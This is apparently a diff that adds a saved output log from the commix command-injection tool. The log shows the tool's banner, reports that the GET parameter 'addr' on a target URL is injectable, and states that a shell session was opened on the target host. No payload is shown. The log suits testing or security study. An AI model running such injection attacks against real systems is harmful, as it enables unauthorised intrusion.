@@ -1,0 +1,13 @@
+                                      __
+   ___   ___     ___ ___     ___ ___ /\_\   __  _
+  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\
+ /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
+ \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\
+  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/  v3.9
+
+[*] Checking connection to the target URL... [ SUCCEED ]
+[*] Testing connection to the target URL.
+[*] Setting GET parameter 'addr' for tests.
+[+] The GET parameter 'addr' seems injectable via (results-based) classic command injection technique.
+[~] The (POSIX) shell session (#0) on target host has been opened.
+[+] The GET parameter 'addr' is vulnerable to results-based command injection.
